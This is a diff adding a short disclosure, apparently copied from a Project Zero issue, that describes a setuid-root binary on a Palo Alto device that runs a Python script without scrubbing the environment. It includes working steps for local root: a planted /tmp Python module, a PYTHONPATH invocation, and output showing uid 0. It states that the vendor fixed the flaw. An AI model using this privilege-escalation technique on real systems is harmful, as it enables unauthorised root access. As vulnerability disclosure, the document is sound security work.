@@ -1,0 +1,20 @@
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=912
+
+The setuid root executable /usr/local/bin/root_trace essentially just does setuid(0) then system("/usr/local/bin/masterd"), which is a python script:
+
+$ ls -l /usr/local/bin/root_trace 
+-rwsr-xr-x 1 root root 12376 Oct 17  2014 /usr/local/bin/root_trace
+
+As the environment is not scrubbed, you can just do something like this:
+
+$ cat /tmp/sysd.py
+import os
+os.system("id")
+os._exit(0);
+
+$ PYTHONPATH=/tmp root_trace
+uid=0(root) gid=502(admin) groups=501(noradgrp),502(admin)
+
+This was fixed by PAN:
+
+http://securityadvisories.paloaltonetworks.com/Home/Detail/67
